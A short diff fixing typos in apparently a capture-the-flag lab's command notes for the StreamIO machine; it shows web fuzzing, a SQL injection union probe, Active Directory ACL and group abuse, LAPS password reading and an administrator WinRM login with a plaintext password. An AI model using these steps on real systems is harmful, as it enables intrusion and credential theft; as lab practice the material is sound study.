@@ -1,5 +1,5 @@
 ```
-(https://watch.streamio.htb/
+https://watch.streamio.htb/
 ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u https://watch.streamio.htb/FUZZ -fc 403 -e .aspx,.php,.txt,.html
 https://watch.streamio.htb/search.php
 10' union select 1,2,3,4,5,6 -- -
@@ -27,7 +27,7 @@ Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred
 Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred
 net group 'CORE STAFF'
 Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
-evil-winrm -i streamIO.htb -u administrator -p e1JFg,55n-b2w5)
+evil-winrm -i streamIO.htb -u administrator -p e1JFg,55n-b2w5
 ```
 
 
